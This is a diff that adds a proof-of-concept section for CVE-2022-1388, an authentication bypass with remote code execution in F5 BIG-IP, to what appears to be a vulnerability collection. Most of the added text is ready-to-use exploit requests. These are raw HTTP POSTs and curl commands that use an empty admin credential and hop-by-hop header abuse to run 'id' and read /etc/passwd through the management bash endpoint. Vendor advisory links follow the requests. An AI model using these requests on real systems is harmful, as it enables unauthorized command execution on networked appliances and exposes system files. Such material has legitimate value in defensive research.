@@ -419,6 +419,73 @@ https://planet.vulbox.com/detail/MTEyNjk=
 
 
 
+## CVE-2022-1388（F5 BIG-IP Remote Code Execution）
+
+```
+# F5 BIG-IP RCE exploitation (CVE-2022-1388)
+
+POST (1): 
+
+POST /mgmt/tm/util/bash HTTP/1.1
+Host: <redacted>:8443
+Authorization: Basic YWRtaW46
+Connection: keep-alive, X-F5-Auth-Token
+X-F5-Auth-Token: 0
+
+{"command": "run" , "utilCmdArgs": " -c 'id' " }
+
+curl commandliner: 
+
+$ curl -i -s -k -X $'POST'
+-H $'Host: <redacted>:8443' 
+-H $'Authorization: Basic YWRtaW46' 
+-H $'Connection: keep-alive, X-F5-Auth-Token' 
+-H $'X-F5-Auth-Token: 0' 
+-H $'Content-Length: 52' 
+--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \'id\' \" }\x0d\x0a'
+$'https://<redacted>:8443/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080
+
+
+POST (2):
+
+POST /mgmt/tm/util/bash HTTP/1.1
+Host: <redateced>:8443
+Authorization: Basic YWRtaW46
+Connection: keep-alive, X-F5-Auth-Token
+X-F5-Auth-Token: 0
+
+{"command": "run" , "utilCmdArgs": " -c ' cat /etc/passwd' " }
+
+curl commandliner:
+
+$ curl -i -s -k -X $'POST'
+-H $'Host: <redacted>:8443' 
+-H $'Authorization: Basic YWRtaW46' -H $'Connection: keep-alive, X-F5-Auth-Token' 
+-H $'X-F5-Auth-Token: 0'
+--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \' cat /etc/passwd\' \" }\x0d\x0a\x0d\x0a'
+$'https://<redacted>/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080
+
+Note: 
+
+Issue could be related between frontend and backend authentication "Jetty" with empty credentials "admin: <empty>" 
++ value of headers ,see "HTTP hop_by_hop request headers"...
+
+References and Fixes :
+* https://support.f5.com/csp/article/K23605346
+* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
+
+Here the documentation used latest nites:
+* https://clouddocs.f5.com/api/icontrol-rest/ 
+
+HTTP hop_by_hop request headers: 
+* https://portswigger.net/research/top-10-web-hacking-techniques-of-2019-nominations-open
+
+# Author
+Alex Hernandez aka @_alt3kx_
+```
+
+
+
 
 
 ## 参考链接
